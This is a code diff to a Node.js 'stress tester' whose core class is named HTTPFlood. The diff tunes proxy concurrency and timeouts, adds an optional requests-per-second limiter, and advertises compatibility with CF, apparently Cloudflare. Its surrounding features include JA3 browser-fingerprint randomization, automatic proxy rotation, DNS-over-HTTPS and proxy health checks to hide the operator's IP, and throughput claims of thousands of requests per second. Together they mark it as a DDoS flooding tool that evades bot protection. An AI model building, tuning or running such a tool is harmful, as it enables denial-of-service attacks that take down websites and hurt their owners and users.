@@ -15,11 +15,11 @@ const { URL } = require('url');
 
 const BANNER = `
 ╔══════════════════════════════════════════════════════════╗
-║    ADVANCED STRESS TESTER V6.0 - M2 OPTIMIZED           ║
-║    Proxy Validation + Smart Selection + High RPS          ║
-║    ✓ 5 Concurrent No-Proxy  ✓ Proxy Target Validation    ║
-║    ✓ 4000ms Direct Timeout  ✓ Auto Bad Proxy Skip        ║
-║    ✓ JA3 Randomization      ✓ 10-30K RPS Capable         ║
+║    ADVANCED STRESS TESTER V6.1 - M2 OPTIMIZED           ║
+║    Proxy Validation + RPS Control + CF Compatible         ║
+║    ✓ 2 Concurrent/Proxy     ✓ RPS Limiter Feature        ║
+║    ✓ 8000ms Proxy Timeout   ✓ Auto Bad Proxy Skip        ║
+║    ✓ JA3 Randomization      ✓ 5-15K RPS with Proxies     ║
 ╚══════════════════════════════════════════════════════════╝
 `;
 
@@ -119,6 +119,7 @@ const config = {
     http2Sessions: new Map(),
     connectionPool: new Map(),
     dnsCache: new Map(),
+    maxRPS: null,
     stats: {
         totalRequests: 0,
         successful: 0,
@@ -689,18 +690,22 @@ class HTTPFlood {
         console.log(`[*] Target: ${this.url}`);
         console.log(`[*] Duration: ${this.duration}s`);
         console.log(`[*] Threads: ${this.threads}`);
-        console.log(`[*] Mode: M2 OPTIMIZED (${config.proxies.length > 0 ? '3' : '5'} concurrent/thread)`);
+        console.log(`[*] Mode: M2 OPTIMIZED (${config.proxies.length > 0 ? '2' : '5'} concurrent/thread)`);
         console.log(`[*] JA3: Valid browser fingerprints + randomization`);
-        console.log(`[*] Protocol: Optimized HTTP/1.1 (${config.proxies.length > 0 ? '5000' : '4000'}ms timeout)`);
+        console.log(`[*] Protocol: Optimized HTTP/1.1 (${config.proxies.length > 0 ? '8000' : '4000'}ms timeout)`);
         console.log(`[*] Connection: 256 socket pool + Keep-Alive`);
         console.log(`[*] IP Leak: DoH DNS + Proxy health monitoring`);
         if (config.proxies.length > 0) {
             console.log(`[*] Proxy: Instant rotation on timeout/abort errors`);
+            console.log(`[*] Proxy: Longer timeout (8s) to ensure traffic reaches target`);
+            if (config.maxRPS) {
+                console.log(`[*] RPS Limit: ${config.maxRPS.toLocaleString()} requests/second (controlled)`);
+            }
         }
         
-        const baseRPS = config.proxies.length > 0 ? 60 : 100;
-        const estimatedRPS = Math.min(this.threads * baseRPS, config.proxies.length > 0 ? 20000 : 40000);
-        console.log(`[*] Estimated throughput: ${estimatedRPS.toLocaleString()}-${(estimatedRPS * 1.5).toLocaleString()} req/s`);
+        const baseRPS = config.proxies.length > 0 ? 40 : 100;
+        const estimatedRPS = Math.min(this.threads * baseRPS, config.maxRPS || (config.proxies.length > 0 ? 15000 : 40000));
+        console.log(`[*] Estimated throughput: ${estimatedRPS.toLocaleString()}-${Math.min((estimatedRPS * 1.5), config.maxRPS || 999999).toLocaleString()} req/s`);
         
         if (this.threads > 100) {
             console.log(`[!] WARNING: ${this.threads} threads may overwhelm MacBook Air M2`);
@@ -739,7 +744,7 @@ class HTTPFlood {
         const endTime = Date.now() + this.duration * 1000;
         
         while (this.running && Date.now() < endTime) {
-            const concurrent = currentProxy ? 3 : 5;
+            const concurrent = currentProxy ? 2 : 5;
             const requests = [];
             
             for (let i = 0; i < concurrent; i++) {
@@ -764,8 +769,8 @@ class HTTPFlood {
                             method: this.method.toLowerCase(),
                             url: targetUrl,
                             headers,
-                            timeout: currentProxy ? 5000 : 4000,
-                            maxRedirects: 5,
+                            timeout: currentProxy ? 8000 : 4000,
+                            maxRedirects: currentProxy ? 3 : 5,
                             validateStatus: () => true,
                             httpsAgent: cachedAgent,
                             httpAgent: cachedAgent,
@@ -844,6 +849,17 @@ class HTTPFlood {
             
             await Promise.allSettled(requests);
             
+            if (config.maxRPS && currentProxy) {
+                const elapsed = (Date.now() - config.stats.startTime) / 1000;
+                const currentRate = config.stats.totalRequests / elapsed;
+                if (currentRate > config.maxRPS) {
+                    const delayNeeded = (config.stats.totalRequests / config.maxRPS - elapsed) * 1000;
+                    if (delayNeeded > 0) {
+                        await new Promise(resolve => setTimeout(resolve, Math.min(delayNeeded, 100)));
+                    }
+                }
+            }
+            
             if (localCount % 50 === 0 && currentProxy) {
                 const health = config.proxyHealth.get(currentProxy);
                 if (health && health.score < 40) {
@@ -909,6 +925,12 @@ async function main() {
                 console.log('[!] Exiting...');
                 rl.close();
                 process.exit(0);
+            }
+        } else {
+            const rpsInput = await question('[?] Set max RPS limit? (leave empty for unlimited): ');
+            if (rpsInput && !isNaN(rpsInput)) {
+                config.maxRPS = parseInt(rpsInput);
+                console.log(`[*] RPS limited to: ${config.maxRPS.toLocaleString()} req/s\n`);
             }
         }
     }
